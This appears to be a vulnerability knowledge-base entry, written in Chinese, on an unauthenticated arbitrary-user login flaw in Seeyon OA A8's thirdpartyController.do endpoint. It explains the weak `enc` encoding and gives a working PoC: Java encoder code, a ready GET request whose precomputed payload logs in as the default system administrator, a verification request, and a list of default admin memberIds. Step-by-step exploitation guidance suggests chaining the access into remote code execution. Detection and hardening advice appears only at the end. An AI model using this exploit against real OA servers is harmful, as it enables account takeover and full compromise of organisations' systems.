---
id: web-java-component-seeyon-thirdpartycontroller-enc-arbitrary-user-login
title: 致远 OA A8 thirdpartyController.do 任意用户登录：enc 为 Base64+字符偏移，伪造 L/M/T 参数指定默认管理员 memberId
type: scenario
domain: web
path: web/java/component
technique: seeyon-thirdpartycontroller-enc-arbitrary-user-login
tags:
- java
- seeyon
- oa
- auth-bypass
- arbitrary-login
- sso
- thirdpartycontroller
- needless-check-login
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: 致远 A8 V7.0（原文漏洞环境；标题写 A8-V5，以原文环境标记为准）
verification:
  verified_by: verifier-V533
  verified_at: '2026-11-11T17:25:26+08:00'
  notes: 已对照原文与13张截图逐张核对：图01 showOnlineUser 返回 currentUserId=-7273032013234748168/currentUserName=系统管理员；图02 spring-portal-thirdpartyIntegration.xml 将 /thirdpartyController.do 映射到 ThirdpartyController；图03 access 方法 @NeedlessCheckLogin 与第276行 LightWeightEncoder.decodeString；图04 decodeString 示例；图05 enc 按&与=分割；图06 L/T/M 校验与 getMessageLinkType().get(linkType)；图07-11 UserMessageUtil→getMessageLinkTypes→messageLinkTypes 静态Map；图12 /base/message-link.properties 键（message.link.bbs.open 等）；图13 getMemberById 后 session.setAttribute(com.seeyon.current_user)。enc 编码已用 Python 独立复算：明文 L=message.link.bbs.open&M=-7273032013234748168&T=9999999999999 逐字符+1 后 Base64 与文中 TT5uZnR0... 完全一致，反向解码亦一致。affected_versions 保留原文双标记（标题 A8-V5、漏洞环境 A8 V7.0），未猜测区间。dedup：仅自身 exact，aiedoc/xrdcontroller/autoinstall 等致远其它接口卡均非同链；dup-scan 无涉及 pair。关联卡 autoinstall-login-locale-zip-traversal、xrdcontroller-checkissign-file-copy-traversal 存在且 verified。未在真实目标执行请求。
url: /docs/web/java/component/web-java-component-seeyon-thirdpartycontroller-enc-arbitrary-user-login/
draft: false
kb_aliases:
- 致远OA 任意用户登录
- thirdpartyController.do
- LightWeightEncoder 任意登录
- 致远 A8 任意用户登录
- seeyon access enc
- 默认管理员 memberId 登录
---

## 一句话结论

致远 OA A8 的 `/seeyon/thirdpartyController.do?method=access&enc=<...>` 接口带 `@NeedlessCheckLogin`，把 `enc` 用 `LightWeightEncoder.decodeString` 解码（Base64 解码后每个字符减 1）成 `L=<linkType>&M=<memberId>&T=<timestamp>`；攻击者只要让 `L` 命中 `/base/message-link.properties` 中任意 `message.link.*` 键、`T` 设为足够大的时间戳绕过有效期判断、`M` 设为已知用户（含默认系统管理员 `-7273032013234748168` 等）的 memberId，接口就会 `orgManager.getMemberById` 查出该用户并把 `com.seeyon.current_user` 写入 session，直接返回该用户的 `JSESSIONID`，实现任意用户登录。

## 原理

- **入口与方法**：Spring 配置 `spring-portal-thirdpartyIntegration.xml` 把 `/thirdpartyController.do` 映射到 `com.seeyon.ctp.portal.sso.thirdpartyintegration.controller.ThirdpartyController`；`access(HttpServletRequest, HttpServletResponse)` 方法标注 `@NeedlessCheckLogin`，即无需登录即可访问。
- **enc 编解码**：`LightWeightEncoder.decodeString` 先做 Base64 解码，再对解码后每个字符 `--`（减 1）。对应的编码就是“每个字符 +1 后 Base64”。例如明文 `L=message.link.bbs.open&M=-7273032013234748168&T=9999999999999` 编码后正是文章中的 `TT5uZnR0YmhmL21qb2wvY2N0L3BxZm8nTj4uODM4NDE0MzEyNDM0NTg1OTI3OSdVPjo6Ojo6Ojo6Ojo6Ojo=`。
- **参数解析**：解密后的字符串按 `&` 分割，再按 `=` 分割成 `encMap`；关键键为 `L`（linkType）、`M`（memberId）、`T`（时间戳）、`P`（path）。
- **时间戳校验可绕过**：当 `L` 非空时，代码用 `T` 计算 `(System.currentTimeMillis() - timeStamp)/1000 > contentLinkValidity*3600` 判断是否过期；`T` 完全由攻击者控制，传入当前时间或极大值（如 `9999999999999`）即可通过。
- **L 必须有效**：`link = UserMessageUtil.getMessageLinkType().get(linkType)` 从 `messageLinkTypes` 取值；该 Map 在启动时从 `/base/message-link.properties` 加载，包含 `message.link.bbs.open`、`message.link.cal.view`、`message.link.doc.open` 等大量键。任选一个存在的键即可通过 `link == null` 检查。
- **M 决定登录身份**：`memberId = Long.parseLong(_memberId)`，随后 `V3xOrgMember member = orgManager.getMemberById(memberId)`；若用户存在，代码创建新的 `User` 对象，依次设置 id/name/loginName/accountId/departmentId 等字段，并执行 `session.setAttribute("com.seeyon.current_user", currentUser)`，把会话身份直接替换为该用户。整个流程没有校验任何密码、令牌或签名，因此是任意用户登录。
- **默认管理员 memberId**：原文给出致远默认账号：`5725175934914479521`（集团管理员）、`-7273032013234748168`（系统管理员）、`-7273032013234748798`（系统监控）、`-4401606663639775639`（审计管理员）。攻击者传入这些 ID 即可获得管理员会话；若知道其他用户 ID，也可登录任意用户。
- **利用后果**：接口响应返回新的 `JSESSIONID`，携带它访问 `/seeyon/online.do?method=showOnlineUser` 可看到 `currentUserId`/`currentUserName`（如系统管理员）；之后可访问所有需要登录的接口，并常与后台上传/反序列化等 RCE 漏洞组合拿服务器权限。

## 触发条件

- 目标为存在该接口与 `@NeedlessCheckLogin` 逻辑的致远 OA A8 版本（原文环境 A8 V7.0）。
- `/seeyon/thirdpartyController.do` 可从攻击者网络访问，未被网关/WAF 拦截。
- 攻击者知道有效的 `message.link.*` 键（默认配置中存在）与目标用户 memberId（默认管理员 ID 公开）。
- 目标未打修复补丁，或修复未覆盖 `access` 方法的 enc 校验。

## 利用步骤

1. 用编码脚本生成 `enc`：明文 `L=message.link.bbs.open&M=<memberId>&T=<当前或极大时间戳>`，每个字符 +1 后 Base64。
2. 发送 `GET /seeyon/thirdpartyController.do?method=access&enc=<enc>`，从响应 `Set-Cookie` 取 `JSESSIONID`。
3. 携带该 `JSESSIONID` 访问 `/seeyon/online.do?method=showOnlineUser`，确认当前用户为目标的 `currentUserId`/`currentUserName`。
4. 使用该会话访问后台管理/文件上传/反序列化等需要登录的接口，按需组合 RCE。
5. 若目标用户 ID 未知，可先尝试默认管理员 ID；或从在线用户/组织架构接口枚举 memberId。

## PoC

编码/解码（Java，等价于原文）：

```java
public static String encodeString(String s) {
    char[] cs = s.toCharArray();
    for (int i = 0; i < cs.length; i++) cs[i]++;
    return new String(new Base64().encode(new String(cs).getBytes()));
}

public static String decodeString(String s) {
    String d = new String(new Base64().decode(s.getBytes()));
    char[] cs = d.toCharArray();
    for (int i = 0; i < cs.length; i++) cs[i]--;
    return new String(cs);
}
```

登录请求（原文示例，解码为 `L=message.link.bbs.open&M=-7273032013234748168&T=9999999999999`）：

```http
GET /seeyon/thirdpartyController.do?method=access&enc=TT5uZnR0YmhmL21qb2wvY2N0L3BxZm8nTj4uODM4NDE0MzEyNDM0NTg1OTI3OSdVPjo6Ojo6Ojo6Ojo6Ojo= HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Connection: close
```

验证：

```http
GET /seeyon/online.do?method=showOnlineUser HTTP/1.1
Host: target
Cookie: JSESSIONID=<响应中的会话>; loginPageURL=; avatarImageUrl=-7273032013234748168
```

响应 JS 中出现 `var currentUserId = "-7273032013234748168"`、`var currentUserName = "系统管理员"` 即成功。

默认管理员 memberId：

```text
5725175934914479521   集团管理员
-7273032013234748168  系统管理员
-7273032013234748798  系统监控
-4401606663639775639  审计管理员
```

## 变体与关联

- 关联：致远 OA 其它历史漏洞（autoinstall 登录 locale zip 路径穿越、xrdController 文件复制穿越等）可与本卡组合形成登录→RCE 链，见 `web-java-component-seeyon-autoinstall-login-locale-zip-traversal`、`web-java-component-seeyon-xrdcontroller-checkissign-file-copy-traversal`。
- 变体：`enc` 的参数可用 `P`（path）等其它键；`L` 可换任意存在的 `message.link.*`；`M` 可换任意已知 memberId；`T` 传极大值或不传（默认 `0` 时会被判过期，需传大值）。
- 变体：若接口对 `enc` 做了额外签名/白名单，需结合其它 SSO 接口或泄露的密钥。

## 检测与防御

- 修复：升级致远 OA 到官方修复版本；对 `thirdpartyController.do` 的 `access` 增加签名/白名单校验，禁止仅凭 enc 中的 memberId 建立会话。
- 加固：网关/WAF 禁止外网直接访问 `thirdpartyController.do`；限制 `message.link.*` 泄露；默认管理员账号改名/禁用或加二次认证。
- 检测：请求 URL 出现 `thirdpartyController.do?method=access&enc=`；`enc` Base64 解码后出现 `L=`/`M=`/`T=`；同一源 IP 短时间内用不同 memberId 获取多个 JSESSIONID；会话在无登录请求的情况下出现 `com.seeyon.current_user`；`showOnlineUser` 返回的 currentUserId 与请求者身份不符。
- 审计：监控默认管理员 memberId 的登录来源与时序，异常时强制下线并排查后续后台操作。
